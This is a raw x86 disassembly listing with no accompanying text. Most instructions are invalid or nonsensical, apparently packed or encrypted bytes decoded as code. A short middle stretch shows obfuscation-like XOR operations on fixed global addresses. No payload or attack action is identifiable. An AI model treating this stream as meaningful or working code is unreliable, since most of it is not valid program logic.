  4084e3:	outs   dx,DWORD PTR ds:[esi]
  4084e4:	js     0x408561
  4084e6:	loopne 0x408496
  4084e8:	cwde   
  4084e9:	stos   BYTE PTR es:[edi],al
  4084ea:	push   ss
  4084eb:	xchg   esi,eax
  4084ec:	push   es
  4084ed:	mov    al,0xf1
  4084ef:	xchg   esp,ebx
  4084f1:	xor    esp,DWORD PTR [ebx+0x56273220]
  4084f7:	test   eax,0x82fa0f90
  4084fc:	(bad)  
  4084fd:	cmc    
  4084fe:	jmp    0x408482
  408500:	dec    esi
  408501:	push   si
  408503:	shr    ebx,0x87
  408506:	paddq  mm3,QWORD PTR [edx]
  408509:	lods   eax,DWORD PTR ds:[esi]
  40850a:	add    BYTE PTR [eax+0x7b],cl
  40850d:	jne    0x4084ec
  40850f:	mov    ecx,0x412a49b2
  408514:	push   ebp
  408515:	pop    ss
  408516:	cs mov ebp,0x73278b99
  40851c:	jns    0x408562
  40851e:	iret   
  40851f:	push   esi
  408520:	in     al,dx
  408521:	mov    DWORD PTR [ebx],edi
  408523:	and    al,0x1d
  408525:	jmp    0x73b5cf55
  40852a:	xor    DWORD PTR [esp+esi*2+0x12640613],0x7ddf5edd
  408535:	ins    DWORD PTR es:[edi],dx
  408536:	and    eax,0x632a6ad3
  40853b:	scas   al,BYTE PTR es:[edi]
  40853c:	xor    eax,0x30214416
  408541:	outs   dx,DWORD PTR ds:[esi]
  408542:	inc    edx
  408543:	and    dh,al
  408545:	xor    BYTE PTR [eax-0x58],0x6c
  408549:	out    dx,al
  40854a:	add    BYTE PTR [ebx+0x781e25fc],dl
  408550:	dec    ebx
  408551:	bound  esp,QWORD PTR [esi-0x36]
  408554:	icebp  
  408555:	adc    ah,BYTE PTR [edi]
  408557:	xor    BYTE PTR [edi+0x67],dh
  40855a:	jmp    0x4085be
  40855c:	add    ecx,DWORD PTR [ebx]
  40855e:	frstor [ebp-0x72]
  408561:	(bad)  
  408562:	ja     0x408546
  408564:	push   edx
  408565:	adc    al,0x20
  408567:	push   es
  408568:	mov    eax,ds:0x938a1fb5
  40856e:	add    cl,bl
  408570:	xor    esp,DWORD PTR [ebx-0x17]
  408573:	std    
  408574:	in     al,0x44
  408576:	push   0xffffffd8
  408578:	loopne 0x408573
  40857a:	jmp    0xa5621703
  40857f:	imul   BYTE PTR [edx-0x2de83754]
  408585:	sti    
  408586:	test   al,0xa4
  408588:	aaa    
  408589:	sahf   
  40858a:	test   eax,0x198b542a
  40858f:	popf   
  408590:	push   ebp
  408591:	dec    ecx
  408592:	jb     0x4085af
  408594:	hlt    
  408595:	mov    WORD PTR [edi+0x49],ss
  408598:	nop
  408599:	ins    DWORD PTR es:[edi],dx
  40859a:	jl     0x4085e2
  40859c:	jb     0x4085f4
  40859e:	ja     0x408521
  4085a0:	test   DWORD PTR [eax],edx
  4085a2:	call   0xf07e228a
  4085a7:	pop    ebx
  4085a8:	fadd   DWORD PTR ds:0xacc1
  4085ad:	(bad)  
  4085ae:	rol    DWORD PTR [eax+eax*4],1
  4085b1:	rcr    ecx,cl
  4085b3:	adc    al,0x5a
  4085b5:	push   ebx
  4085b6:	fxch   st(0)
  4085b8:	retf   0x1cd
  4085bb:	sub    BYTE PTR [eax],0xd7
  4085be:	sub    dl,BYTE PTR [edi+0x9]
  4085c1:	sub    dl,BYTE PTR [ecx-0x66ee979e]
  4085c7:	jns    0x408575
  4085c9:	adc    al,0x3e
  4085cb:	mov    eax,0xf157be3d
  4085d0:	stc    
  4085d1:	paddusw mm1,QWORD PTR [ecx-0x38c6b1df]
  4085d8:	sub    al,0x39
  4085da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085db:	sub    BYTE PTR [esi+0x14],cl
  4085de:	jmp    0x12d7:0x5a930836
  4085e5:	mov    ch,0x8f
  4085e7:	xor    eax,0x67a7ca24
  4085ed:	pusha  
  4085ee:	rol    edx,0x1f
  4085f1:	push   0xf6963e2f
  4085f6:	cmp    ecx,DWORD PTR [edi+ebp*1]
  4085f9:	or     cl,BYTE PTR [edx]
  4085fb:	aaa    
  4085fc:	xlat   BYTE PTR ds:[ebx]
  4085fd:	shl    dl,1
  4085ff:	and    DWORD PTR [edi+0x42944f07],ebp
  408605:	stos   DWORD PTR es:[edi],eax
  408606:	xlat   BYTE PTR ds:[bx]
  408608:	xor    eax,DWORD PTR [esi+0x3c]
  40860b:	or     dh,BYTE PTR [esi-0x12e7fb0c]
  408611:	out    dx,eax
  408612:	jmp    0x40866d
  408614:	sbb    eax,0x4e203bc2
  408619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40861a:	sub    eax,DWORD PTR [ebp-0x2f35644c]
  408620:	icebp  
  408621:	icebp  
  408622:	repz fwait
  408624:	mov    al,ds:0xd2978793
  408629:	popf   
  40862a:	xchg   ecx,eax
  40862b:	in     eax,dx
  40862c:	loopne 0x408603
  40862e:	sbb    bl,BYTE PTR [ebx-0x24]
  408631:	mov    WORD PTR [ecx+0x25167f0b],?
  408637:	in     al,dx
  408638:	xchg   esi,eax
  408639:	xchg   ebx,eax
  40863a:	adc    DWORD PTR [edi+0x3b],edi
  40863d:	xchg   ebx,eax
  40863e:	xor    DWORD PTR [ebx],edx
  408640:	mov    bl,0xbe
  408642:	aad    0x4
  408644:	push   cs
  408645:	fs call 0xd4d9483f
  40864b:	test   BYTE PTR [esi-0x329555b7],ah
  408651:	scas   al,BYTE PTR es:[edi]
  408652:	mov    al,0x5f
  408654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408655:	dec    ebp
  408656:	push   edx
  408657:	push   0x5d7f99f3
  40865c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40865d:	or     ecx,DWORD PTR [esi+0x77]
  408660:	or     eax,0xce58a6b3
  408665:	ficomp WORD PTR [edi+0x64ecd17d]
  40866b:	xchg   esp,eax
  40866c:	fwait
  40866d:	xor    DWORD PTR [ebx],eax
  40866f:	and    BYTE PTR [eax],dl
  408671:	fcmovu st,st(3)
  408673:	pop    ds
  408674:	je     0x4086f4
  408676:	push   0x37
  408678:	push   eax
  408679:	je     0x4086d5
  40867b:	(bad)
  40867e:	add    DWORD PTR ds:0x39b95b1a,ecx
  408684:	mov    DWORD PTR [edx+eax*1+0x5cc9979],esp
  40868b:	outs   dx,BYTE PTR ds:[esi]
  40868c:	push   ecx
  40868d:	dec    esi
  40868e:	fs test al,0xd0
  408691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408692:	dec    edx
  408693:	mov    eax,0xd588313f
  408698:	aas    
  408699:	imul   edi,DWORD PTR [ebx-0x71ed0148],0x36631581
  4086a3:	inc    ebx
  4086a4:	add    bl,bh
  4086a6:	xor    eax,0x5d890043
  4086ab:	hlt    
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x5061a1b6],ecx
  4086ca:	pop    edx
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	xor    bl,BYTE PTR [ebp+0x75e227af]
  4086d9:	pop    ebx
  4086da:	mov    ah,0x93
  4086dc:	inc    ebp
  4086dd:	imul   ebp,DWORD PTR [esi-0x1c],0x7
  4086e1:	sti    
  4086e2:	pop    ds
  4086e3:	mov    eax,0x1b40d87e
  4086e8:	popa   
  4086e9:	sti    
  4086ea:	popa   
  4086eb:	mov    ebx,0x948799a1
  4086f0:	dec    edi
  4086f1:	mov    eax,ds:0x2bba33a7
  4086f6:	mov    ds:0xb2c60220,eax
  4086fb:	ds pushf 
  4086fd:	cmp    bl,bl
  4086ff:	sbb    al,BYTE PTR es:[edx]
  408702:	ficomp WORD PTR [esi]
  408704:	dec    ebp
  408705:	mov    dl,0xfe
  408707:	arpl   WORD PTR [eax+0x2c4b495f],dx
  40870d:	js     0x4086a4
  40870f:	fdivp  st(5),st
  408711:	aad    0xf9
  408713:	test   al,0xfe
  408715:	imul   BYTE PTR [edx-0x1e62533b]
  40871b:	sub    eax,0xcb291525
  408720:	push   esp
  408721:	jmp    0xd722:0xc60be7b3
  408728:	push   esi
  408729:	sub    DWORD PTR [edi],esp
  40872b:	or     eax,0x4a0bd51b
  408730:	iret   
  408731:	hlt    
  408732:	pop    ecx
  408733:	pop    esp
  408734:	xor    eax,0x39c2b392
  408739:	inc    eax
  40873a:	cwde   
  40873b:	popa   
  40873c:	push   0x6f
  40873e:	jl     0x40871f
  408740:	sahf   
  408741:	fcmovb st,st(3)
  408743:	ror    DWORD PTR [ebp-0x24a6fbfb],0x54
  40874a:	jbe    0x4086ef
  40874c:	ret    0xda62
  40874f:	jmp    0x4086f3
  408751:	adc    BYTE PTR [edx],al
  408753:	sbb    eax,ebp
  408755:	xchg   edi,eax
  408756:	loopne 0x4086f5
  408758:	adc    ah,BYTE PTR [eax+edi*1+0x18859d80]
  40875f:	xchg   ecx,eax
  408760:	jne    0x408718
  408762:	lds    ecx,FWORD PTR [ecx-0x7e]
  408765:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408767:	mov    edx,0xfa1b5156
  40876c:	jbe    0x408746
  40876e:	jns    0x408715
  408770:	aam    0x19
  408772:	xchg   WORD PTR [esi+0x613db1c3],bp
  408779:	pop    eax
  40877a:	or     ah,BYTE PTR [ecx-0x17]
  40877d:	jbe    0x4087aa
  40877f:	xor    esp,DWORD PTR [edi-0x1cce742e]
  408785:	xchg   esp,eax
  408786:	jmp    DWORD PTR [eax+0x22]
  408789:	or     edx,ebx
  40878b:	sub    al,0x67
  40878d:	mov    ?,WORD PTR [edi]
  40878f:	pop    ebx
  408790:	and    al,0x74
  408792:	cmp    ecx,DWORD PTR [ecx+ebx*4]
  408795:	addr16 push esp
  408797:	pop    ebp
  408798:	ins    BYTE PTR es:[edi],dx
  408799:	cmp    bh,bl
  40879b:	aam    0x2c
  40879d:	or     esi,0x952352b8
  4087a3:	call   0xc3dc576f
  4087a8:	(bad)  [eax+0x24]
  4087ab:	sub    eax,0xabfa3113
  4087b0:	nop
  4087b1:	jle    0x40877f
  4087b3:	xchg   BYTE PTR [eax],bl
  4087b5:	stc    
  4087b6:	ja     0x408809
  4087b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b9:	dec    ecx
  4087ba:	mov    ebx,0xc4187ed6
  4087bf:	cmp    cl,BYTE PTR [edi-0x754d23d5]
  4087c5:	adc    DWORD PTR [edx+0x6c],ebx
  4087c8:	das    
  4087c9:	cld    
  4087ca:	test   eax,0xbf0eb2e0
  4087cf:	sar    BYTE PTR [edi+edx*2+0x4c],0x9f
  4087d4:	stos   BYTE PTR es:[edi],al
  4087d5:	in     al,0xcd
  4087d7:	js     0x4087de
  4087d9:	xor    ebp,DWORD PTR [edi+0x4c7f5bcc]
  4087df:	(bad)  
  4087e0:	fstp   DWORD PTR [edx-0xa78ed91]
  4087e6:	ret    
  4087e7:	mov    dh,0x68
  4087e9:	adc    BYTE PTR [edx-0x7c],al
  4087ec:	in     eax,dx
  4087ed:	mov    al,bh
  4087ef:	aaa    
  4087f0:	(bad)  
  4087f1:	mov    ecx,ebx
  4087f3:	and    BYTE PTR [ecx+0x5c],ch
  4087f6:	mov    esp,0x8eca810c
  4087fb:	cmp    eax,0xf5a8039d
  408800:	inc    edi
  408801:	aam    0x1c
  408803:	pop    ebp
  408804:	rcl    BYTE PTR [ecx-0x457a34d4],cl
  40880a:	pop    edi
  40880b:	hlt    
  40880c:	jmp    0x143d:0x1ee5b995
  408813:	shl    BYTE PTR [eax+0x14],cl
  408816:	iret   
  408817:	inc    eax
  408818:	pop    esp
  408819:	int    0xd0
  40881b:	sbb    eax,0x107c7def
  408820:	pusha  
  408821:	cmp    BYTE PTR [ebp-0x12bd78d],0x43
  408828:	push   es
  408829:	daa    
  40882a:	jo     0x408818
  40882c:	add    al,0x7f
  40882e:	in     eax,dx
  40882f:	repz sub ebp,DWORD PTR [eax+ecx*1-0x6d510eb3]
  408837:	and    eax,0x28209e9c
  40883c:	sub    eax,0xb9e636cf
  408841:	dec    esp
  408842:	ret    
  408843:	shr    edi,0xf0
  408846:	std    
  408847:	xlat   BYTE PTR ds:[ebx]
  408848:	fistp  QWORD PTR [ecx-0x19]
  40884b:	es out dx,al
  40884d:	ret    0x8fb2
  408850:	mov    eax,0x5be6f997
  408855:	mov    eax,ds:0x72d64670
  40885a:	sti    
  40885b:	xchg   edx,eax
  40885c:	ins    DWORD PTR es:[edi],dx
  40885d:	sub    DWORD PTR [ebx-0x431bf85a],0x9
  408864:	jmp    0x4088c8
  408866:	dec    ebx
  408867:	xor    ebx,esi
  408869:	js     0x40884c
  40886b:	cmp    ah,bh
  40886d:	(bad)  
  40886e:	fstp   DWORD PTR [edx+0x13f98667]
  408874:	push   0xffffffef
  408876:	fistp  QWORD PTR [ebp+0x2]
  408879:	xor    ch,cl
  40887b:	imul   ebx,DWORD PTR [esi-0x64],0xffffffa5
  40887f:	test   eax,0xc93bbb96
  408884:	pslld  mm1,QWORD PTR [edi-0x4a7644f6]
  40888b:	push   edx
  40888c:	xor    BYTE PTR [eax+0x3e470d1c],dh
  408892:	add    BYTE PTR [edi+0x13489bdb],bh
  408898:	push   ecx
  408899:	scas   al,BYTE PTR es:[edi]
  40889a:	add    DWORD PTR [eax],ecx
  40889c:	mov    WORD PTR [ebp+0xd47e36d],ds
  4088a2:	pop    ebp
  4088a3:	pop    ebx
  4088a4:	and    dh,BYTE PTR [edi+0x7c]
  4088a7:	dec    ebp
  4088a8:	in     al,0x12
  4088aa:	les    eax,FWORD PTR [ecx+0x76]
  4088ad:	icebp  
  4088ae:	shl    ebp,cl
  4088b0:	mov    ds:0x1a359cee,eax
  4088b5:	jne    0x4088f9
  4088b7:	es mov ecx,0x6f8ee74
  4088bd:	fstp   TBYTE PTR [ebx+0x370e2d4d]
  4088c3:	jecxz  0x408880
  4088c5:	xchg   ebp,eax
  4088c6:	clc    
  4088c7:	add    BYTE PTR [ebx+0x1a],ah
  4088ca:	dec    ecx
  4088cb:	neg    ebx
  4088cd:	push   edx
  4088ce:	dec    esi
  4088cf:	int3   
  4088d0:	(bad)  
  4088d1:	repnz sbb ebx,DWORD PTR [eax]
  4088d4:	nop
  4088d5:	jge    0x408937
  4088d7:	sahf   
  4088d8:	daa    
  4088d9:	sahf   
  4088da:	jmp    0x83daf9c2
  4088df:	int3   
  4088e0:	push   eax
  4088e1:	adc    eax,0x4a2d200e
  4088e6:	into   
  4088e7:	xor    DWORD PTR [eax-0x4f19654f],0xfffffffe
  4088ee:	sub    esi,ebx
  4088f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088f2:	mov    ecx,0x300b47ca
  4088f7:	jbe    0x40892a
  4088f9:	mul    BYTE PTR [esi+0x8be8e6]
  4088ff:	xor    DWORD PTR ds:0x433663,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x4a78bf2c
  408968:	push   ebx
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	pop    edi
  408972:	pushf  
  408973:	mov    BYTE PTR [edx+0x23],dh
  408976:	jae    0x4089c6
  408978:	dec    ebx
  408979:	jne    0x408927
  40897b:	std    
  40897c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40897d:	dec    ecx
  40897e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40897f:	add    BYTE PTR [edx+esi*1-0x3873b8da],bl
  408986:	int    0xb8
  408988:	pop    ebx
  408989:	mov    bl,0x9d
  40898b:	std    
  40898c:	jno    0x40892d
  40898e:	mov    ecx,0x276b295b
  408993:	xchg   ebp,eax
  408994:	add    BYTE PTR [esi],cl
  408996:	cmp    DWORD PTR [edi],ebx
  408998:	pop    ebx
  408999:	mov    bl,0x95
  40899b:	lock ins BYTE PTR es:[edi],dx
  40899d:	push   esi
  40899e:	jb     0x408931
  4089a0:	add    ch,BYTE PTR [esi-0x2be4259c]
  4089a6:	xchg   ebp,eax
  4089a7:	xor    al,BYTE PTR [ebx-0x3d]
  4089aa:	pop    ebx
  4089ab:	and    eax,0xf81720b6
  4089b0:	or     eax,0x6ec94500
  4089b5:	popf   
  4089b6:	call   DWORD PTR gs:[esi+ebp*1]
  4089ba:	sar    BYTE PTR [ebp+ebx*2-0x74],1
  4089be:	jne    0x4089bc
  4089c0:	es pop esi
  4089c2:	std    
  4089c3:	lock mov edx,0x620a25ea
  4089c9:	ss (bad) 
  4089cc:	retf   0xec96
  4089cf:	and    BYTE PTR ss:[eax],ah
  4089d2:	pop    edx
  4089d3:	xor    BYTE PTR [ecx],al
  4089d5:	cmc    
  4089d6:	sbb    DWORD PTR [ecx],0x73
  4089d9:	xor    al,0x11
  4089db:	and    DWORD PTR [edx-0x4e],esi
  4089de:	add    esp,edx
  4089e0:	xchg   edx,eax
  4089e1:	shl    BYTE PTR [edx+0x5d],cl
  4089e4:	js     0x408967
  4089e6:	sbb    eax,DWORD PTR [edx+0xc]
  4089e9:	stc    
  4089ea:	xchg   ebx,eax
  4089eb:	sahf   
  4089ec:	stc    
  4089ed:	sbb    eax,0x286af960
  4089f2:	imul   DWORD PTR [esi]
  4089f4:	push   0xccd05c81
  4089f9:	sub    DWORD PTR [ecx],esi
  4089fb:	mov    WORD PTR [ebx],ss
  4089fd:	adc    DWORD PTR [edx],0x17
  408a00:	out    0x9,eax
  408a02:	jmp    0x502f:0x4e87cbc6
  408a09:	or     dl,0xb5
  408a0c:	inc    esi
  408a0d:	mov    ah,0x4a
  408a0f:	std    
  408a10:	rcl    DWORD PTR [edx+0x30bf3c49],cl
  408a16:	scas   eax,DWORD PTR es:[edi]
  408a17:	add    al,0xfe
  408a19:	ss out 0x26,al
  408a1c:	pop    eax
  408a1d:	(bad)  
  408a1e:	or     al,0x7c
  408a20:	sbb    eax,0xe128dc97
  408a25:	sub    esi,DWORD PTR [ecx-0x53]
  408a28:	jle    0x408a44
  408a2a:	test   DWORD PTR [edi-0x478c29e0],esp
  408a30:	cli    
  408a31:	int    0xd8
  408a33:	mov    BYTE PTR [ebx],al
  408a35:	fld    DWORD PTR [eax+edx*4-0x51]
  408a39:	or     DWORD PTR [ecx],edx
  408a3b:	popa   
  408a3c:	ss fmul st(5),st
  408a3f:	xor    DWORD PTR [ebx+eiz*4+0x39],ebp
  408a43:	repnz mov BYTE PTR [edx],dh
  408a46:	dec    edi
  408a47:	aad    0x60
  408a49:	aaa    
  408a4a:	ins    DWORD PTR es:[edi],dx
  408a4b:	push   ebp
  408a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a4d:	and    edx,DWORD PTR [eax]
  408a4f:	mov    ds,WORD PTR [esi]
  408a51:	nop
  408a52:	or     BYTE PTR [eax],dl
  408a54:	dec    eax
  408a55:	push   ecx
  408a56:	push   esi
  408a57:	fldenv [eax]
  408a59:	ins    DWORD PTR es:[edi],dx
  408a5a:	repz iret 
  408a5c:	pop    edx
  408a5d:	and    dl,BYTE PTR [esi+0x58]
  408a60:	pop    edx
  408a61:	xchg   BYTE PTR [ebp-0x51],bl
  408a64:	sub    BYTE PTR [ebx],bl
  408a66:	test   eax,0x71501abf
  408a6b:	pusha  
  408a6c:	pop    ecx
  408a6d:	pop    es
  408a6e:	data16 fisttp DWORD PTR [edi+ecx*1]
  408a72:	jae    0x408a16
  408a74:	adc    BYTE PTR [esi+0x3cdda6dd],dh
  408a7a:	sbb    DWORD PTR [ecx+0x5c29c82f],ebx
  408a80:	pop    edx
  408a81:	jno    0x408a0a
  408a83:	pop    ds
  408a84:	push   cs
  408a85:	icebp  
  408a86:	pop    edx
  408a87:	add    eax,0xbb227c7b
  408a8c:	pop    edi
  408a8d:	pusha  
  408a8e:	stos   DWORD PTR es:[edi],eax
  408a8f:	cmc    
  408a90:	xor    ebp,ebx
  408a92:	dec    esp
  408a93:	pop    edi
  408a94:	sub    ch,BYTE PTR [edx+0xa]
  408a97:	daa    
  408a98:	shr    BYTE PTR [ecx],1
  408a9a:	je     0x408a81
  408a9c:	adc    al,0x44
  408a9e:	std    
  408a9f:	dec    ebx
  408aa0:	loope  0x408a99
  408aa2:	pop    esp
  408aa3:	push   ss
  408aa4:	pop    es
  408aa5:	xchg   esi,eax
  408aa6:	mov    edx,DWORD PTR [ecx+ecx*8-0x76222e2c]
  408aad:	adc    al,0xf4
  408aaf:	into   
  408ab0:	mov    WORD PTR [edi],fs
  408ab2:	jmp    0xd219c6b5
  408ab7:	cmp    al,0xde
  408ab9:	or     BYTE PTR [edx-0x85c2567],al
  408abf:	jno    0x408ace
  408ac1:	arpl   WORD PTR [eax-0x289df362],bx
  408ac7:	arpl   WORD PTR [ecx+0x69],bp
  408aca:	adc    DWORD PTR [ecx+0x17],ecx
  408acd:	retf   
  408ace:	fisub  WORD PTR [ebx]
  408ad0:	loope  0x408ace
  408ad2:	fdiv   DWORD PTR [edi+0x6b]
  408ad5:	push   0xde2a7814
  408ada:	xchg   edi,eax
  408adb:	mov    bl,0xf0
  408add:	lods   eax,DWORD PTR ds:[esi]
  408ade:	adc    dl,BYTE PTR [eax-0xe3245e9]
  408ae4:	add    al,0x94
  408ae6:	call   0x5a5c9cd1
  408aeb:	xchg   esi,eax
  408aec:	shr    dl,0xe
  408aef:	xor    al,0x95
  408af1:	mov    cl,0x28
  408af3:	jecxz  0x408ab8
  408af5:	or     al,0x9
  408af7:	inc    ecx
  408af8:	xor    eax,0x3edad7e3
  408afd:	xchg   esp,ecx
  408aff:	add    BYTE PTR [ebp-0x6ddb6297],cl
  408b05:	sbb    DWORD PTR [edi+ebp*4+0x50],ebx
  408b09:	dec    ebx
  408b0a:	dec    ebx
  408b0b:	fst    DWORD PTR [esi]
  408b0d:	sbb    eax,ebp
  408b0f:	sbb    al,0x7b
  408b11:	mov    esi,0x7f933178
  408b16:	test   al,0x51
  408b18:	xchg   ecx,eax
  408b19:	(bad)  
  408b1a:	scas   eax,DWORD PTR es:[edi]
  408b1b:	and    DWORD PTR [ebx-0x31],edx
  408b1e:	scas   eax,DWORD PTR es:[edi]
  408b1f:	mov    es,esp
  408b21:	inc    esi
  408b22:	cdq    
  408b23:	nop
  408b24:	dec    ebp
  408b25:	sbb    eax,0x13bed7f2
  408b2a:	xchg   edx,eax
  408b2b:	cmp    al,0xc3
  408b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b2e:	(bad)  
  408b2f:	xchg   ebp,eax
  408b30:	in     al,dx
  408b31:	mov    edx,0xae4476f9
  408b36:	cmp    ch,BYTE PTR [eax+ebp*8]
  408b39:	jp     0x408ae6
  408b3b:	ficomp DWORD PTR [edx]
  408b3d:	mov    esp,0x72cbe1bd
  408b42:	mov    edi,0x2b3509f9
  408b47:	test   eax,0x6c95e06a
  408b4c:	(bad)  
  408b4d:	mov    edi,0xc1b28268
  408b52:	aas    
  408b53:	js     0x408b73
  408b55:	mov    cl,0xe6
  408b57:	outs   dx,BYTE PTR ds:[esi]
  408b58:	xchg   cx,ax
  408b5a:	lds    ecx,FWORD PTR [ebx-0x46b8c5ac]
  408b60:	(bad)  
  408b61:	out    dx,eax
  408b62:	pop    ss
  408b63:	mov    BYTE PTR [ebx+0x27],ah
  408b66:	das    
  408b67:	sbb    BYTE PTR [edi],al
  408b69:	mov    dh,0x1c
  408b6b:	and    al,0xcd
  408b6d:	(bad)  
  408b6e:	out    dx,eax
  408b6f:	mov    ecx,0x5add6f93
  408b74:	sahf   
  408b75:	pop    edx
  408b76:	dec    esp
  408b77:	jge    0x408b21
  408b79:	jle    0x408b95
  408b7b:	in     eax,0x36
  408b7d:	and    bl,BYTE PTR [di-0x25]
  408b81:	mov    dh,0xff
  408b83:	jbe    0x408b1b
  408b85:	jl     0x408baf
  408b87:	dec    ebx
  408b88:	inc    eax
  408b89:	jge    0x408c08
  408b8b:	cmp    BYTE PTR [edi+ecx*2+0x79],dh
  408b8f:	inc    eax
  408b90:	shl    BYTE PTR [edi+0x22],cl
  408b93:	push   esi
  408b94:	cmp    al,0x30
  408b96:	pop    edi
  408b97:	test   DWORD PTR [ebx-0x7af02e58],ebx
  408b9d:	sbb    eax,0x8b000000
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	jo     0x408c4d
  408bf2:	jno    0x408bcf
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	push   edx
  408bfd:	test   bh,ah
  408bff:	mov    ebx,0xcaf40faf
  408c04:	nop
  408c05:	sbb    BYTE PTR [ecx-0x6ad85385],ch
  408c0b:	cmc    
  408c0c:	fadd   st,st(0)
  408c0e:	xchg   ebx,eax
  408c0f:	push   es
  408c10:	jp     0x408ba4
  408c12:	mov    ecx,fs
  408c14:	test   eax,0xfe9374f4
  408c19:	mov    ah,0x47
  408c1b:	fldl2t 
  408c1d:	inc    BYTE PTR [ebp+0x526f3a3a]
  408c23:	xor    al,0x4b
  408c25:	leave  
  408c26:	mov    es,WORD PTR [esi-0x1bea1465]
  408c2c:	and    al,0x39
  408c2e:	test   eax,0xa0ccc09
  408c33:	push   edi
  408c34:	je     0x408c48
  408c36:	(bad)  
  408c37:	mov    ebx,0x8fa0fa65
  408c3c:	and    ecx,DWORD PTR [edi+0x7b]
  408c3f:	add    eax,0xb6892f5d
  408c44:	fwait
  408c45:	xchg   edx,eax
  408c46:	call   0x33ec:0xdd303ba1
  408c4d:	mov    eax,DWORD PTR [edi+0x1f]
  408c50:	rcl    BYTE PTR cs:[ebx+0x2c],cl
  408c54:	jae    0x408c8b
  408c56:	dec    eax
  408c57:	sar    bh,cl
  408c59:	xor    DWORD PTR [edi-0x39],edi
  408c5c:	pop    esi
  408c5d:	cmp    eax,DWORD PTR [eax]
  408c5f:	jnp    0x408cc9
  408c61:	mov    dh,0xe7
  408c63:	xchg   edx,eax
  408c64:	ins    BYTE PTR es:[edi],dx
  408c65:	hlt    
  408c66:	leave  
  408c67:	(bad)  
  408c68:	nop
  408c69:	mov    bl,0x5a
  408c6b:	mov    esp,0xd17e3a6c
  408c70:	ror    edx,0x33
  408c73:	popa   
  408c74:	jle    0x408cef
  408c76:	push   es
  408c77:	sbb    BYTE PTR [ecx+eiz*8+0x20],bh
  408c7b:	sub    esi,DWORD PTR [esi+eax*4]
  408c7e:	mov    edi,es
  408c80:	and    eax,0x162070dd
  408c85:	test   al,0xef
  408c87:	mov    al,BYTE PTR [edi+0x44]
  408c8a:	ins    BYTE PTR es:[edi],dx
  408c8b:	ret    0xf30f
  408c8e:	push   eax
  408c8f:	adc    al,0xc0
  408c91:	sar    BYTE PTR [edx+0x68944226],1
  408c97:	loope  0x408c5d
  408c99:	dec    esi
  408c9a:	sbb    eax,0xd5bb5fce
  408c9f:	pop    ecx
  408ca0:	push   ebp
  408ca1:	scas   eax,DWORD PTR es:[edi]
  408ca2:	push   eax
  408ca3:	loopne 0x408d21
  408ca5:	pop    ebp
  408ca6:	std    
  408ca7:	mov    bh,0xc4
  408ca9:	sub    bh,BYTE PTR [esi]
  408cab:	retf   0x961d
  408cae:	xchg   ebp,eax
  408caf:	mov    ecx,0x37acaf65
  408cb4:	cwde   
  408cb5:	std    
